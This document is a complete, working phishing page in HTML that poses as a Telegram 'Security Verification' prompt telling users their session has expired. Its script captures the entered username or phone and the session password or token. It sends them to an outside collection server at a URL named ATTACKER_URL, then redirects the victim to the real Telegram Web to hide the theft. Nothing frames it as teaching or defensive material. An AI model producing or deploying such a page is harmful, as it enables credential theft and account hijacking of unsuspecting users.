<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Telegram Security Update</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); width: 350px; text-align: center; }
        h2 { color: #0088cc; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Security Verification</h2>
        <p>Your session has expired. Please re-authenticate to continue using Telegram Web.</p>
        <form id="hijackForm">
            <input type="text" id="user_id" placeholder="Username / Phone" required>
            <input type="password" id="auth_token" placeholder="Session Password / Token" required>
            <button type="submit">Re-authenticate</button>
        </form>
    </div>

    <script>
        const ATTACKER_URL = "https://my-session-interceptor.onrender.com/capture";

        document.getElementById('hijackForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const user_id = document.getElementById('user_id').value;
            const auth_token = document.getElementById('auth_token').value;

            // The "One-Click" happens here: we send the credentials to the attacker
            try {
                const response = await fetch(ATTACKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id, auth_token })
                });

                if (response.ok) {
                    // Redirect to real Telegram to make it look like a real error
                    window.location.href = "https://web.telegram.org";
                }
            } catch (err) {
                console.error("Error:", err);
                window.location.href = "https://web.telegram.org";
            }
        });
    </script>
</body>
</html>
